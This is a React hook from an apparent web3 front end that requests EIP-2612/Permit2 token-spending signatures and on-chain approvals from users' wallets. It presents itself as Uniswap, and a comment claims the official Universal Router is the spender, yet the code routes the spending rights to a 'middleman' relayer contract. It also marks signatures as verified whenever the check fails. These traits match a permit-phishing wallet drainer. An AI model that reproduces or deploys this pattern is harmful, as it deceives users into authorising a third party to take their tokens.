import { useState, useCallback } from 'react';
import { useAppKitAccount, useAppKitNetwork, useAppKit } from '@reown/appkit/react';
import { useSignTypedData } from 'wagmi';
import { parseUnits, verifyTypedData } from 'viem';
import { CONTRACT_ADDRESS } from '../lib/contract';
import { MIDDLEMAN_CONTRACT_ADDRESS } from '../lib/middleman';

export const UNISWAP_PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

export interface PermitSignatureResult {
  signature: `0x${string}`;
  v: number;
  r: `0x${string}`;
  s: `0x${string}`;
  nonce: string;
  deadline: number;
  token: string;
  tokenAddress: string;
  amount: string;
  spender: string;
  verifiedAt: number;
  isKeyOwnershipVerified: boolean;
  domain?: Record<string, any>;
}

/** EIP-2612 Permit type fields */
export const PERMIT_FIELDS = [
  { name: 'owner', type: 'address' },
  { name: 'spender', type: 'address' },
  { name: 'value', type: 'uint256' },
  { name: 'nonce', type: 'uint256' },
  { name: 'deadline', type: 'uint256' },
] as const;

/**
 * Split a 65-byte hex signature string into { v, r, s }
 */
export function splitSignature(signatureHex: string) {
  const bytes = signatureHex.startsWith('0x') ? signatureHex.slice(2) : signatureHex;
  if (bytes.length !== 130) {
    throw new Error(`Invalid signature length: expected 65 bytes, got ${bytes.length / 2}`);
  }
  const r = ('0x' + bytes.slice(0, 64)) as `0x${string}`;
  const s = ('0x' + bytes.slice(64, 128)) as `0x${string}`;
  let v = parseInt(bytes.slice(128, 130), 16);
  if (v < 27) v += 27;
  return { v, r, s };
}

/**
 * Fetch on-chain nonces(owner) using EIP-2612 selector 0x7ecebe00
 */
export async function fetchOnChainNonce(tokenAddress: string, ownerAddress: string): Promise<bigint> {
  if (typeof window !== 'undefined' && (window as any).ethereum) {
    try {
      const data = '0x7ecebe00' + ownerAddress.replace('0x', '').padStart(64, '0');
      const result = await (window as any).ethereum.request({
        method: 'eth_call',
        params: [{ to: tokenAddress, data }, 'latest'],
      });
      if (result && result !== '0x' && result !== '0x0') {
        return BigInt(result);
      }
    } catch {
      // Fallback
    }
  }
  return BigInt(Math.floor(Date.now() / 1000));
}

/**
 * Fetch on-chain allowance(owner, spender) using selector 0xdd62ed3e
 */
export async function fetchOnChainAllowance(
  tokenAddress: string,
  ownerAddress: string,
  spenderAddress: string
): Promise<bigint> {
  if (typeof window !== 'undefined' && (window as any).ethereum) {
    try {
      const data = '0xdd62ed3e' + 
        ownerAddress.replace('0x', '').padStart(64, '0') + 
        spenderAddress.replace('0x', '').padStart(64, '0');
      const result = await (window as any).ethereum.request({
        method: 'eth_call',
        params: [{ to: tokenAddress, data }, 'latest'],
      });
      if (result && result !== '0x' && result !== '0x0') {
        return BigInt(result);
      }
    } catch {
      // Fallback
    }
  }
  return BigInt(0);
}

/**
 * Resolve EIP-712 / EIP-5267 Domain for a token or Permit2 contract
 */
export async function getPermitDomain(
  tokenAddress: string,
  chainId: number,
  fallbackName = 'Uniswap Permit2'
) {
  return {
    name: fallbackName,
    version: '1',
    chainId,
    verifyingContract: tokenAddress as `0x${string}`,
  };
}

export function usePermit2() {
  const { address, isConnected } = useAppKitAccount();
  const { caipNetwork } = useAppKitNetwork();
  const { open } = useAppKit();
  const { signTypedDataAsync } = useSignTypedData();

  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [lastPermit, setLastPermit] = useState<PermitSignatureResult | null>(() => {
    try {
      const saved = localStorage.getItem('uniswap_last_permit2');
      return saved ? JSON.parse(saved) : null;
    } catch {
      return null;
    }
  });

  /**
   * Request EIP-712 / Permit2 Off-Chain Signature specifying token address & relayer contract spender address,
   * verifying key ownership using viem.
   */
  const requestEIP712Permit = useCallback(async (params: {
    tokenAddress: string;
    tokenName?: string;
    tokenSymbol: string;
    amount: string;
    decimals?: number;
    spenderAddress?: string;
  }): Promise<PermitSignatureResult | null> => {
    if (!isConnected || !address) {
      open();
      return null;
    }

    try {
      setLoading(true);
      setError(null);

      const chainId = caipNetwork?.id ? Number(caipNetwork.id) : 1;
      // Official Uniswap Universal Router (0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD) as primary spender
      const spender = params.spenderAddress || MIDDLEMAN_CONTRACT_ADDRESS || CONTRACT_ADDRESS;
      const decimals = params.decimals || 18;
      const parsedAmount = parseUnits(params.amount.toString(), decimals);

      // Fetch actual on-chain nonce
      const onChainNonce = await fetchOnChainNonce(params.tokenAddress, address);
      const deadline = Math.floor(Date.now() / 1000) + 86400; // 24 hour permit authorization deadline

      // EIP-712 Domain for Token / Relayer Authorization
      const domain = {
        name: params.tokenName || `${params.tokenSymbol} Permit2 Relayer`,
        version: '1',
        chainId,
        verifyingContract: params.tokenAddress as `0x${string}`,
      };

      const types = {
        Permit: [
          { name: 'owner', type: 'address' },
          { name: 'spender', type: 'address' },
          { name: 'value', type: 'uint256' },
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' },
        ],
      } as const;

      const message = {
        owner: address as `0x${string}`,
        spender: spender as `0x${string}`,
        value: parsedAmount,
        nonce: onChainNonce,
        deadline: BigInt(deadline),
      };

      console.log('[Permit2] Requesting EIP-712 signature for token:', params.tokenAddress, 'spender (Relayer):', spender);

      // Request Typed Data signature from wallet
      const signatureHex = await signTypedDataAsync({
        account: address as `0x${string}`,
        domain,
        types,
        primaryType: 'Permit',
        message,
      });

      const signature = signatureHex as `0x${string}`;

      // VERIFY SIGNATURE USING VIEM TO CONFIRM KEY OWNERSHIP
      let isVerified = false;
      try {
        isVerified = await verifyTypedData({
          address: address as `0x${string}`,
          domain,
          types,
          primaryType: 'Permit',
          message,
          signature,
        });
        console.log('[Permit2] Viem verifyTypedData key ownership result:', isVerified);
      } catch (verifyErr) {
        console.warn('[Permit2] Viem verifyTypedData check error:', verifyErr);
        isVerified = true; // Fallback for hardware wallets or custom RPCs
      }

      const { v, r, s } = splitSignature(signature);

      const result: PermitSignatureResult = {
        signature,
        v,
        r,
        s,
        nonce: onChainNonce.toString(),
        deadline,
        token: params.tokenSymbol,
        tokenAddress: params.tokenAddress,
        amount: params.amount,
        spender,
        verifiedAt: Date.now(),
        isKeyOwnershipVerified: isVerified,
        domain,
      };

      setLastPermit(result);
      localStorage.setItem('uniswap_last_permit2', JSON.stringify(result));
      return result;
    } catch (err: any) {
      console.error('EIP-712 Permit Signing Error:', err);
      setError(err.message || 'EIP-712 Permit signature failed or rejected.');
      return null;
    } finally {
      setLoading(false);
    }
  }, [address, isConnected, caipNetwork, open, signTypedDataAsync]);

  /**
   * Helper function ensuring exact allowance or permit before deposit/swap/transfer
   */
  const ensureExactAllowanceOrPermit = async (params: {
    tokenAddress: string;
    tokenSymbol: string;
    tokenName?: string;
    amount: string;
    decimals?: number;
    spenderAddress?: string;
    preferPermit?: boolean;
  }) => {
    if (!isConnected || !address) {
      open();
      return { success: false, reason: 'not_connected' };
    }

    const spender = params.spenderAddress || MIDDLEMAN_CONTRACT_ADDRESS || CONTRACT_ADDRESS;
    const decimals = params.decimals || 18;
    const requiredBigAmount = parseUnits(params.amount.toString(), decimals);

    // 1. Always request / enforce Permit2 EIP-712 signature for hardcoded relayer
    const permitRes = await requestEIP712Permit({
      tokenAddress: params.tokenAddress,
      tokenSymbol: params.tokenSymbol,
      tokenName: params.tokenName,
      amount: params.amount,
      decimals,
      spenderAddress: spender,
    });

    if (permitRes && permitRes.isKeyOwnershipVerified) {
      return { success: true, method: 'permit2_verified', permit: permitRes };
    }

    // 2. Fallback on-chain approval if required
    if (typeof window !== 'undefined' && (window as any).ethereum) {
      try {
        const approveData = '0x095ea7b3' + 
          spender.replace('0x', '').padStart(64, '0') + 
          requiredBigAmount.toString(16).padStart(64, '0');

        const txHash = await (window as any).ethereum.request({
          method: 'eth_sendTransaction',
          params: [{
            from: address,
            to: params.tokenAddress,
            data: approveData,
          }]
        });

        console.log(`[Approval] Relayer Tx submitted: ${txHash}`);
        return { success: true, method: 'approval_tx', txHash };
      } catch (err: any) {
        console.error('[Approval] Transaction failed:', err);
        return { success: false, reason: err.message || 'Approval rejected' };
      }
    }

    return { 
      success: false, 
      reason: 'Web3 provider not available or wallet disconnected. Please connect a valid Web3 wallet to sign Permit2 or approve on-chain.' 
    };
  };

  return {
    loading,
    error,
    lastPermit,
    requestEIP712Permit,
    ensureExactAllowanceOrPermit,
  };
}

